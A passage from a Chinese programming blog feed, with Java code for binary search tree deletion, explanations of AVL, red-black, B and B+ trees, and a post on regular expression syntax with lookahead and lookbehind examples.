设为右（左）子树的父节点，该节点的右（左）子节点设为右（左）子树</span></span><br><span class="line"><span class="comment">//                 * 2.非根节点、叶子节点：把左（右）子节点设为父节点的新左或右子节点，其余部分与根节点情况类似</span></span><br><span class="line"><span class="comment">//                 * 3.叶子节点：node的父节点的左（右）子节点置为null，node.parent置为null</span></span><br><span class="line"><span class="comment">//                 */</span></span><br><span class="line"><span class="comment">//                TreeNode node = getNode(root, value);</span></span><br><span class="line"><span class="comment">//                TreeNode result = node;</span></span><br><span class="line"><span class="comment">//                if (node == null) &#123;</span></span><br><span class="line"><span class="comment">//                    return null;</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                TreeNode nodeLeft = node.left;</span></span><br><span class="line"><span class="comment">//                TreeNode nodeRight = node.right;</span></span><br><span class="line"><span class="comment">//                if (nodeLeft != null &amp;&amp; nodeRight != null) &#123;</span></span><br><span class="line"><span class="comment">//                    if (node.parent == null) &#123;</span></span><br><span class="line"><span class="comment">//                        // 存在左右子节点，删除根节点的情况</span></span><br><span class="line"><span class="comment">//                        root = nodeLeft;</span></span><br><span class="line"><span class="comment">//                        nodeLeft.parent = null;</span></span><br><span class="line"><span class="comment">//                    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//                        // 存在左右子节点，删除非根节点的情况</span></span><br><span class="line"><span class="comment">//                        node.parent.left = nodeLeft;</span></span><br><span class="line"><span class="comment">//                        nodeLeft.parent = node.parent;</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                    TreeNode lr = nodeLeft;</span></span><br><span class="line"><span class="comment">//                    while (true) &#123;</span></span><br><span class="line"><span class="comment">//                        if (lr.right != null) &#123;</span></span><br><span class="line"><span class="comment">//                            // 找到根节点的左子节点的最右子节点</span></span><br><span class="line"><span class="comment">//                            lr = lr.right;</span></span><br><span class="line"><span class="comment">//                        &#125; else &#123;</span></span><br><span class="line"><span class="comment">//                            break;</span></span><br><span class="line"><span class="comment">//                        &#125;</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                    nodeRight.parent = lr;</span></span><br><span class="line"><span class="comment">//                    lr.right = nodeRight;</span></span><br><span class="line"><span class="comment">//                &#125; else if (nodeLeft == null &amp;&amp; nodeRight != null) &#123;</span></span><br><span class="line"><span class="comment">//                    if (node.parent == null) &#123;</span></span><br><span class="line"><span class="comment">//                        // 不存在左子节点，存在右子节点，删除根节点的情况</span></span><br><span class="line"><span class="comment">//                        root = nodeRight;</span></span><br><span class="line"><span class="comment">//                        nodeRight.parent = null;</span></span><br><span class="line"><span class="comment">//                    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//                        // 不存在左子节点，存在右子节点，删除非根节点的情况</span></span><br><span class="line"><span class="comment">//                        node.parent.right = nodeRight;</span></span><br><span class="line"><span class="comment">//                        nodeRight.parent = node.parent;</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                &#125; else if (nodeLeft != null &amp;&amp; nodeRight == null) &#123;</span></span><br><span class="line"><span class="comment">//                    if (node.parent == null) &#123;</span></span><br><span class="line"><span class="comment">//                        // 存在左子节点，不存在右子节点，删除根节点的情况</span></span><br><span class="line"><span class="comment">//                        root = nodeLeft;</span></span><br><span class="line"><span class="comment">//                        nodeLeft.parent = null;</span></span><br><span class="line"><span class="comment">//                    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//                        // 存在左子节点，不存在右子节点，删除非根节点的情况</span></span><br><span class="line"><span class="comment">//                        node.parent.left = nodeLeft;</span></span><br><span class="line"><span class="comment">//                        nodeLeft.parent = node.parent;</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                &#125; else &#123;</span></span><br><span class="line"><span class="comment">//                    if (node.parent == null) &#123;  // 只有一个节点的情况</span></span><br><span class="line"><span class="comment">//                        root = new TreeNode();</span></span><br><span class="line"><span class="comment">//                    &#125; else if (node.parent.left.equals(node)) &#123;     // 叶子节点的情况</span></span><br><span class="line"><span class="comment">//                        node.parent.left = null;</span></span><br><span class="line"><span class="comment">//                    &#125; else if (node.parent.right.equals(node)) &#123;    // 叶子节点的情况</span></span><br><span class="line"><span class="comment">//                        node.parent.right = null;</span></span><br><span class="line"><span class="comment">//                    &#125;</span></span><br><span class="line"><span class="comment">//                &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                // 清空被删除的节点</span></span><br><span class="line"><span class="comment">//                node.value = null;</span></span><br><span class="line"><span class="comment">//                node.parent = null;</span></span><br><span class="line"><span class="comment">//                node.left = null;</span></span><br><span class="line"><span class="comment">//                node.right = null;</span></span><br><span class="line"><span class="comment">//                node = null;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                return result.value;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 找到被删除节点后，判断子节点个数，被删除节点用node表示，np表示node.parent，</span></span><br><span class="line"><span class="comment">             * nl表示node.left，nr表示node.right：</span></span><br><span class="line"><span class="comment">             * - 0，若np == null，说明被删除节点为根节点，且整棵树只有一个节点，root = null；</span></span><br><span class="line"><span class="comment">             *      反之为叶子节点，np.left(right) = null。</span></span><br><span class="line"><span class="comment">             * - 1，若np == null，说明被删除节点为根节点，且只有一个子节点（左/右），</span></span><br><span class="line"><span class="comment">             *          root = nl(nr)，nl(nr).parent = null。</span></span><br><span class="line"><span class="comment">             *      反之，先判断node == np.left，若是，则np.left = nl == null ? nr : nl，</span></span><br><span class="line"><span class="comment">             *          若不是，则np.right = nl == null ? nr : nl，然后nl(nr).parent = np。</span></span><br><span class="line"><span class="comment">             * - 2，有两个子节点，被删除节点的值用其左（右）子节点的最右（左）子节点的值替换，然后删除这个替换节点（前驱或后继）</span></span><br><span class="line"><span class="comment">             *      删除替换节点建议调用当前方法删除，因为这个节点可能存在0或1个子节点。</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * 注意：子节点个数为0，1的情况需要清空node，为2的情况是替换其value，不需要清空，被替换的节点需要删除。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">private</span> TreeNode <span class="title function_">removeNode</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">result</span> <span class="operator">=</span> node;</span><br><span class="line">                <span class="comment">// 被删除的节点不存在</span></span><br><span class="line">                <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">np</span> <span class="operator">=</span> node.parent;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">nl</span> <span class="operator">=</span> node.left;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">nr</span> <span class="operator">=</span> node.right;</span><br><span class="line">                <span class="keyword">if</span> (nl == <span class="literal">null</span> &amp;&amp; nr == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (np == <span class="literal">null</span>) &#123;</span><br><span class="line">                        root = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (np.left == node) &#123;</span><br><span class="line">                        np.left = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        np.right = <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nl != <span class="literal">null</span> &amp;&amp; nr == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (np == <span class="literal">null</span>) &#123;</span><br><span class="line">                        root = nl;</span><br><span class="line">                        nl.parent = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (np.left == node) &#123;</span><br><span class="line">                        np.left = nl;</span><br><span class="line">                        nl.parent = np;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        np.right = nl;</span><br><span class="line">                        nl.parent = np;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nl == <span class="literal">null</span> &amp;&amp; nr != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (np == <span class="literal">null</span>) &#123;</span><br><span class="line">                        root = nr;</span><br><span class="line">                        nr.parent = <span class="literal">null</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (np.left == node) &#123;</span><br><span class="line">                        np.left = nr;</span><br><span class="line">                        nr.parent = np;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        np.right = nr;</span><br><span class="line">                        nr.parent = np;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    TreeNode nlr;</span><br><span class="line">                    <span class="comment">// 找到左子节点的最右子节点，或不找前驱找后继也行</span></span><br><span class="line">                    <span class="keyword">for</span> (nlr = nl; nlr.right != <span class="literal">null</span>; nlr = nlr.right) &#123;&#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 保存nlr的value</span></span><br><span class="line">                    <span class="type">Integer</span> <span class="variable">nlrv</span> <span class="operator">=</span> nlr.value;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 删除nlr</span></span><br><span class="line">                    <span class="type">TreeNode</span> <span class="variable">res</span> <span class="operator">=</span> removeNode(nlr);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 用nlrv替换被删除节点的value</span></span><br><span class="line">                    node.value = nlrv;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> res;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 清空被删除的节点</span></span><br><span class="line">                node.value = <span class="literal">null</span>;</span><br><span class="line">                node.parent = <span class="literal">null</span>;</span><br><span class="line">                node.left = <span class="literal">null</span>;</span><br><span class="line">                node.right = <span class="literal">null</span>;</span><br><span class="line">                node = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 删：方法二</span></span><br><span class="line">            <span class="keyword">public</span> Integer <span class="title function_">remove</span><span class="params">(Integer value)</span> &#123;</span><br><span class="line">                <span class="comment">// 查找到被删除节点</span></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> getNode(root, value);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 删除节点</span></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">result</span> <span class="operator">=</span> removeNode(node);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> result == <span class="literal">null</span> ? <span class="literal">null</span> : result.value;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="3-平衡二叉树（AVL）"><a href="#3-平衡二叉树（AVL）" class="headerlink" title="3. 平衡二叉树（AVL）"></a>3. 平衡二叉树（AVL）</h1><p>​		AVL树是最先发明的自平衡二叉查找树。在AVL树中任何节点的两个子树的高度最大差别为1，所以它也被称为高度平衡树。增加和删除可能需要通过一次或多次树旋转来重新平衡这个树。本质上也是一种二叉查找树（BST），时间复杂度O(logN)，推导过程如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">AVL树节点个数N &lt;= 2^0 + 2^1 + 2^2 + ... + 2^(h-1)，h为树高，从h=1开始，求h?</span><br><span class="line">由于2^h = 2*2^(h-1)，先计算2^h - N：</span><br><span class="line"></span><br><span class="line">  2^h - N</span><br><span class="line">&gt;=2*2^(h-1) - 2^(h-1) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">&gt;=2^(h-1) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">&gt;=2*2^(h-2) - 2^(h-2) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">&gt;=2^(h-2) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">&gt;=2*2^(h-3) - 2^(h-3) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">&gt;=2^(h-3) - ... - 2^2 - 2^1 - 2^0</span><br><span class="line">...</span><br><span class="line">&gt;=2^1-2^0</span><br><span class="line">&gt;=1</span><br><span class="line"></span><br><span class="line">即：2^h &gt;= N + 1，由于log(x)为单调递增函数：</span><br><span class="line">===&gt;log(2^h) &gt;= log(N + 1)</span><br><span class="line">===&gt;h &gt;= log(N + 1)</span><br><span class="line">===&gt;h &gt; log(N)</span><br><span class="line">故：AVL时间复杂度为O(logN)。</span><br></pre></td></tr></table></figure>

<p>平衡因子：判断AVL树是否平衡的标准。平衡因子 &#x3D; 右子树高度 - 左子树高度。任何节点平衡因子的绝对值小于等于1，称作平衡。</p>
<p>插入与删除：与二叉查找树类似（可查看 2. 二叉查找树 中的demo），但不同的是，插入或删除时，需要维持二叉树的平衡性，下图为失衡的4种情况，在插入或删除时，根据实际情况相应调整（x为新插入的节点；p为失衡节点；pl为p左子节点；pr为p右子节点；左旋 - 绕其右子节点逆时针旋转到下一个位置；右旋 - 绕其左子节点顺时针旋转到下一个位置）：</p>
<p><img src="/../img/avl_tree_4_rotate.png"></p>
<h1 id="4-红黑树（RBT）"><a href="#4-红黑树（RBT）" class="headerlink" title="4. 红黑树（RBT）"></a>4. 红黑树（RBT）</h1><p>​		红黑树是一种平衡二叉树的变体，它的左右子树高差有可能大于 1，所以红黑树不是严格意义上的平衡二叉树（AVL），但对之进行平衡的代价较低，其平均统计性能要强于AVL ，时间复杂度O(logN)。</p>
<p>特性：</p>
<ol>
<li>节点是红色或黑色。</li>
<li>根节点是黑色。</li>
<li>所有叶子都是黑色。（叶子是NULL节点，不满2个子节点的节点均可以用黑色的NULL节点补全）。</li>
<li>每个红色节点的两个子节点都是黑色。（从每个叶子到根的所有路径上不能有两个连续的红色节点）。</li>
<li>从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点。</li>
</ol>
<p>特征4、5确定了最短可能路径只包含黑色节点，最长可能路径由红黑节点组成，且最长不超过最短的2倍。</p>
<h2 id="4-1-插入"><a href="#4-1-插入" class="headerlink" title="4.1 插入"></a>4.1 插入</h2><p>节点插入情况，如下图所示：</p>
<ol>
<li>插入节点为根节点；</li>
<li>插入节点父节点为黑色；</li>
<li>插入节点父节点为红色，叔叔节点为红色；</li>
<li>插入节点父节点为红色，叔叔节点为黑色；（第4点有四种情况，类似AVL中的LL、LR、RR、RL的情况）</li>
</ol>
<p><img src="/../img/red_black_tree_ins7.png"></p>
<h2 id="4-2-删除"><a href="#4-2-删除" class="headerlink" title="4.2 删除"></a>4.2 删除</h2><p>节点删除情况，如下图所示：</p>
<ol>
<li>被删除的节点为叶子节点，且为红色。不影响黑高，直接删除。</li>
<li>被删除的节点为叶子节点，且为黑色。影响黑高，删除后需要调整。（下文分析）</li>
<li>被删除的节点有且仅有1个子节点，那么该子节点一定是叶子节点。用叶子节点的值替换被删除节点的值，然后删除叶子节点，把问题转化为删除叶子的情况（1、2点）。其中，可能出现的组合：①被删-黑，叶子-红；②被删-红，叶子-黑；③被删-黑，叶子-黑；（①为情况1，②③为情况2）。</li>
<li>被删除的节点有2个子节点，用它的前驱（后继）节点的值替换被删节点的值，然后删除前驱（后继）节点。前驱（后继）节点可能有0（情况1、2）或1个子节点（情况3）。</li>
</ol>
<p>也就是说，其它情况均能转化为情况1、2，而情况1可以直接删除不需要处理，关键在于分析情况2，解决要求删除后黑高不变：</p>
<p>​	Ⅰ. 兄弟节点为黑色，只有左子节点（一定是红色）。</p>
<p>​	Ⅱ. 兄弟节点为黑色，只有右子节点（一定是红色）。</p>
<p>​	Ⅲ. 兄弟节点为黑色，有两个子节点（一定都是红色）。</p>
<p>​	Ⅳ. 兄弟节点为黑色，无子节点。</p>
<p>​	Ⅴ. 兄弟节点为红色。</p>
<p><img src="/../img/red_black_tree_del5.png"></p>
<h2 id="4-3-与AVL对比"><a href="#4-3-与AVL对比" class="headerlink" title="4.3 与AVL对比"></a>4.3 与AVL对比</h2><p>虽然两者时间复杂度都是O(logN)，但具体细节略有不同：</p>
<p>查询：因为RBT的平衡不是绝对的平衡，树的高度可能比AVL略高，查询略逊色一点，特别是最差的情况（最长路径是最短的2倍少1）。</p>
<p>插入：RBT的插入与AVL一样，最多只需要旋转2次可达到平衡，RBT需要变色，但代价很小。</p>
<p>删除：RBT的删除最多只需要旋转3次就可以达到平衡，旋转量级为O(1)，而AVL需要维护被删节点到根节点路径上所有节点的平衡，旋转量级为O(logN)，RBT删除性能远高于AVL。</p>
<p>因此，在实际中，删除操作极少的情况下，选择AVL，其它情况均选用RBT。</p>
<h1 id="5-B树"><a href="#5-B树" class="headerlink" title="5. B树"></a>5. B树</h1><p>​		B树是一种自平衡多叉树，能够保持数据有序。这种数据结构能够让查找数据、顺序访问、插入数据及删除的动作，都在对数时间内完成，时间复杂度为O(logN)。常被应用在数据库和文件系统上。（2-3树、2-3-4树都是B树）</p>
<p>一颗m阶树有如下特征：</p>
<ol>
<li>每个节点的结构最多由m个子节点和m-1个关键字构成：P0, K0, P1, K1, …, Pm-2, Km-2，Pm-1。其中P为子节点，K为关键字。关键字通常指的是键值对（key-value），关键字的大小则是指关键字的key的大小。</li>
<li>根节点最少可以有1个关键字，非根节点最少要有Math.ceil(m&#x2F;2)-1个关键字。</li>
<li>每个节点的关键字从小到大排列，它的左子树的所有关键字比它小，右子树的所有关键字比它大。</li>
<li>所有叶子节点位于同一层，且数据只能从叶子插入。</li>
</ol>
<h2 id="5-1-插入"><a href="#5-1-插入" class="headerlink" title="5.1 插入"></a>5.1 插入</h2><p>步骤：</p>
<ol>
<li>若为空树，创建节点，指定为根节点，在上面插入关键字，插入完成退出。反之，根据K大小，找到对应的叶子节点进行插入。</li>
<li>插入后，若该节点K的个数不超过m-1，插入完成退出。反之，执行步骤3。</li>
<li>以该节点中间的K为中心，左右两边分裂成左右子树，中间的K插入父节点，中间K的左右子节点分别指向分裂后的左右子树，当前节点指向父节点，继续判断父节点K的个数，即重复步骤2、3。</li>
</ol>
<p>以5阶B树为例，插入：200, 100, 300, 50, 150, 90, 120, 30, 350, 400, 450</p>
<p>1）插入：200, 100, 300, 50</p>
<p><img src="/../img/b_tree_ins_1.png"></p>
<p>2）插入：150</p>
<p><img src="/../img/b_tree_ins_2.png"></p>
<p>3）插入：90</p>
<p><img src="/../img/b_tree_ins_3.png"></p>
<p>4）插入：120</p>
<p><img src="/../img/b_tree_ins_4.png"></p>
<p>5）插入：30</p>
<p><img src="/../img/b_tree_ins_5.png"></p>
<p>6）插入：350</p>
<p><img src="/../img/b_tree_ins_6.png"></p>
<p>7）插入：400</p>
<p><img src="/../img/b_tree_ins_7.png"></p>
<p>8）插入：450</p>
<p><img src="/../img/b_tree_ins_8.png"></p>
<h2 id="5-2-删除"><a href="#5-2-删除" class="headerlink" title="5.2 删除"></a>5.2 删除</h2><p>步骤：</p>
<ol>
<li>若为空树或不存在对应的K，直接返回失败。反之，找到包含K的节点。若该节点不是叶子节点，用它的前驱（后继）节点的最大（小）K的值替换它的值，然后删除前驱（后继）节点中的K，由特征4可知，该前驱（后继）节点一定是叶子节点，所以只需要分析K在叶子节点上的情况。</li>
<li>删除后，若当前节点K的个数小于Math.ceil(m&#x2F;2)-1，且不是根节点，执行步骤3。反之，删除完成退出。</li>
<li>若当前节点的兄弟节点K的个数大于Math.ceil(m&#x2F;2)-1，父节点的K下移到当前节点（并排好序），兄弟节点的K上移到父节点。反之，父节点的K下移，与当前节点和兄弟节点的K合并成一个新的节点，父节点K的左右子节点合并成1个子节点，指向新节点，当前节点指向父节点，继续判断父节点K的个数，即重复步骤2、3。</li>
</ol>
<p>关于步骤3的细节：父节点下移，兄弟节点上移。若是左兄弟，左兄弟的右子节点成为父节点下移后的左子节点；若是右兄弟，右兄弟的左子节点成为父节点下移后的右子节点。（除了叶子节点，其它层的节点有充足的K可以借给它的兄弟节点时，就能察觉到，这里没有演示。6.2 B+树删除第3小点有类似的操作。）</p>
<p>继续插入：320, 330, 325, 40, 46, 70, 80，如下图，再删除：120, 90</p>
<p><img src="/../img/b_tree_del_1.png"></p>
<hr>
<p>1）删除：120</p>
<p><img src="/../img/b_tree_del_2.png"></p>
<hr>
<p>2）删除：90</p>
<p><img src="/../img/b_tree_del_3.png"></p>
<hr>
<p><img src="/../img/b_tree_del_4.png"></p>
<hr>
<p><img src="/../img/b_tree_del_5.png"></p>
<h1 id="6-B-树"><a href="#6-B-树" class="headerlink" title="6. B+树"></a>6. B+树</h1><p>​		B树的一种变体，叶子节点形成一个链表，方便范围查找和排序。</p>
<p>与B树不同的特征：</p>
<ol>
<li>非叶子节点不保存数据，只保存索引，称为索引节点，数据都保存在叶子节点上。</li>
<li>相邻的叶子节点之间存在指针，且按小到大的顺序链接起来。</li>
<li>索引节点上的所有索引由小到大排列，每个索引左子树的所有索引比它小，右子树的所有索引大于等于它。（数据存叶子上，所以右子树的可以相等）</li>
</ol>
<h2 id="6-1-插入"><a href="#6-1-插入" class="headerlink" title="6.1 插入"></a>6.1 插入</h2><p>步骤：</p>
<ol>
<li>若为空树，创建叶子节点，指定为根节点，在上面插入关键字，插入完成退出。反之，根据索引大小，找到对应的叶子节点进行插入。</li>
<li>插入后，若该节点K的个数不超过m-1，插入完成退出。反之，把当前节点大致平均分成左右子节点，左子节点的下一个节点指向右子节点，把右子节点最小K的索引插入父节点（父节点为索引节点），这个索引的左右子节点分别指向分裂后的左右子节点，当前节点指向父节点，执行步骤3。</li>
<li>这一步主要处理索引节点的情况，若索引节点的索引个数不超过m-1，插入完成退出。反之，以节点的中间索引为中心，左右两边分裂成左右子索引节点，把中间索引插入到父索引节点中，中间索引的左右子节点分别指向分裂后的左右子索引节点，当前节点指向父索引节点，重复执行第3步。</li>
</ol>
<p>以5阶B+树为例，插入：200, 100, 300, 50, 150, 90, 120, 30, 350, 400, 450</p>
<p>1）插入：200, 100, 300, 50</p>
<p><img src="/../img/b_plus_tree_ins_1.png"></p>
<p>2）插入：150</p>
<p><img src="/../img/b_plus_tree_ins_2.png"></p>
<p>3）插入：90</p>
<p><img src="/../img/b_plus_tree_ins_3.png"></p>
<p>4）插入：120</p>
<p><img src="/../img/b_plus_tree_ins_4.png"></p>
<p>5）插入：30</p>
<p><img src="/../img/b_plus_tree_ins_5.png"></p>
<p>6）插入：350</p>
<p><img src="/../img/b_plus_tree_ins_6.png"></p>
<p>7）插入：400</p>
<p><img src="/../img/b_plus_tree_ins_7.png"></p>
<p>8）插入：450</p>
<p><img src="/../img/b_plus_tree_ins_8.png"></p>
<h2 id="6-2-删除"><a href="#6-2-删除" class="headerlink" title="6.2 删除"></a>6.2 删除</h2><p>步骤：</p>
<ol>
<li>若为空树或不存在对应的K，直接返回失败。反之，找到包含K的叶子节点。</li>
<li>删除后，若该节点K的个数小于Math.ceil(m&#x2F;2)-1，且不是根节点，执行步骤3。反之，删除完成退出。</li>
<li>若该节点的兄弟节点K的个数大于Math.ceil(m&#x2F;2)-1，且为左（右）兄弟，把兄弟节点最大（小）的K移到当前节点的最前（后）位置，更新父节点索引为其右子节点的最小索引。反之，把当前节点与兄弟节点合并成一个新的节点，删除父节点对应的索引，父节点索引左右子节点合并成1个节点，指向新节点。</li>
<li>若父索引节点的索引个数小于Math.ceil(m&#x2F;2)-1，且不是根节点，当前节点指向父节点，开始处理索引节点，执行步骤5。</li>
<li>若当前节点（已经指向父索引节点）的兄弟节点索引的个数大于Math.ceil(m&#x2F;2)-1，则它的父节点的索引下移到当前节点，兄弟节点的索引上移到父节点。反之，父节点的索引下移，与当前节点和兄弟节点的索引合并成一个新的节点，父节点索引的左右子节点合并成1个子节点，指向新节点，当前节点指向父节点，继续判断父节点索引的个数，即重复步骤4、5。</li>
</ol>
<p>关于步骤5的细节：父节点的索引下移，兄弟节点索引上移。若是左兄弟，左兄弟的右子节点成为父节点下移后的左子节点；若是右兄弟，右兄弟的左子节点成为父节点下移后的右子节点。（除了叶子节点，其它层的节点有充足的索引可以借给它的兄弟节点时，就能察觉到，如这里的删除90。）步骤4，5实际上就是与B树删除的后续步骤一样了。</p>
<p>继续插入：320, 330, 325, 40, 46, 70, 335，如下图，再删除（非根节点的K数量最小值Math.ceil(5&#x2F;2)-1 &#x3D; 2）：70, 50, 90, 200</p>
<p><img src="/../img/b_plus_tree_del_1.png"></p>
<hr>
<p>1）删除：70，K数量满足，不需要额外调整。</p>
<p><img src="/../img/b_plus_tree_del_2.png"></p>
<hr>
<p>2）删除：50，K数量不足，其右兄弟节点有冗余，借一个过来，父节点索引值更新为右兄弟最小索引100。</p>
<p><img src="/../img/b_plus_tree_del_3.png"></p>
<hr>
<p>3）删除：90，K数量不足，左右兄弟节点数量刚刚好，没有冗余；</p>
<p><img src="/../img/b_plus_tree_del_4.png"></p>
<hr>
<p>​	与兄弟节点组成新节点，删掉父索引；父索引不足，但父索引的兄弟有冗余。</p>
<p><img src="/../img/b_plus_tree_del_5.png"></p>
<hr>
<p>​	爷爷索引下移，叔叔索引上移，叔叔索引的左子节点变成爷爷节点的新右子节点。</p>
<p><img src="/../img/b_plus_tree_del_6.png"></p>
<hr>
<p>4）删除：200，K数量不足，兄弟节点也没有冗余，删除父索引后，叔叔索引也没有冗余，最终父节点、叔叔节点、爷爷节点合并。</p>
<p><img src="/../img/b_plus_tree_del_7.png"></p>
<hr>
<p><img src="/../img/b_plus_tree_del_8.png"></p>
<hr>
<p><img src="/../img/b_plus_tree_del_9.png"></p>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>树</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>树</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2019/07/10/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="字符含义"><a href="#字符含义" class="headerlink" title="字符含义"></a>字符含义</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?表示前面的字符重复0次或1次，相当于&#123;0,1&#125;</span><br><span class="line">+表示前面的字符重复至少1次，相当于&#123;1,&#125;</span><br><span class="line">*表示前面的字符重复0次或多次，相当于&#123;0,&#125;，在*或者+后面加上?，从贪心变成非贪心</span><br><span class="line">^以什么开头，$以什么结尾，例如：^[0-9]+$表示以数字开始也以数字结尾，在方括号中使用^代表非的意思，例如：[^abc]表示匹配abc以外的字符</span><br><span class="line">|在括号内使用代表匹配其中一个，例如(a|b|c)等效于[abc]</span><br><span class="line"></span><br><span class="line">\b表示匹配单词边界中的字符，例如：\bHel，表示匹配以Hel开头的单词中的Hel，Hel\b，表示以Hel结尾的单词中的Hel</span><br><span class="line">\B匹配非边界字符</span><br><span class="line">\n换行符</span><br><span class="line">\r回车符</span><br><span class="line">\f换页符</span><br><span class="line">\t制表符</span><br><span class="line">\d数字</span><br><span class="line">\D非数字</span><br><span class="line">\s任何空白字符</span><br><span class="line">\S任何非空白字符</span><br><span class="line">\w数字、字母、下划线</span><br><span class="line">\W非数字、字母、下划线</span><br><span class="line"></span><br><span class="line">\1表示前面第一个()里面的表达式，例如：(abc)\1匹配abcabc</span><br></pre></td></tr></table></figure>

<h1 id="前瞻后顾"><a href="#前瞻后顾" class="headerlink" title="前瞻后顾"></a>前瞻后顾</h1><p>?&#x3D;、?&lt;&#x3D;、?!、?&lt;!</p>
<p>exp1(?&#x3D;exp2) 	&#x2F;&#x2F; 前瞻，查找exp2前面的exp1<br>(?&lt;&#x3D;exp2)exp1 	&#x2F;&#x2F; 后顾，查找exp2后面的exp1<br>exp1(?!exp2) 	&#x2F;&#x2F;负前瞻，查找后面不是exp2的exp1<br>(?&lt;!exp2)exp1 	&#x2F;&#x2F;负后顾，查找前面不是exp2的exp1</p>
<p>案例一：中国人 俄国人 法国人 德国人</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配法国人的国字：(?&lt;=法)国(?=人)</span><br><span class="line">匹配除了法国人的其它国字：(?&lt;!法)国|国(?!人)</span><br></pre></td></tr></table></figure>

<p>案例二：北京市(朝阳区)(西城区)(海淀区)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配北京市：</span><br><span class="line"></span><br><span class="line">public class ProvinceMatcher &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String str = &quot;北京市(朝阳区)(西城区)(海淀区)&quot;;</span><br><span class="line">        Pattern p = Pattern.compile(&quot;[^()]+?(?=\\()&quot;);  //匹配北京市</span><br><span class="line">        Matcher m = p.matcher(str);</span><br><span class="line">//        m.groupCount();     //正则表达式有几个分组</span><br><span class="line">//        m.matches();     //只有整体匹配才返回true</span><br><span class="line">//        m.lookingAt();      //匹配开头部分</span><br><span class="line">//        m.find();       //部分匹配，匹配到的字符串可以在任何位置</span><br><span class="line">        while(m.find()) &#123;</span><br><span class="line">//            start、end、group均可加一个参数，代表的是第几组匹配的字符串的下标</span><br><span class="line">//            m.start();      //获取匹配字符串开始的下标</span><br><span class="line">//            m.end();       //获取匹配字符串结束+1的下标</span><br><span class="line">//            m.group();  //获取匹配的字符串</span><br><span class="line">            System.out.println(m.group());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

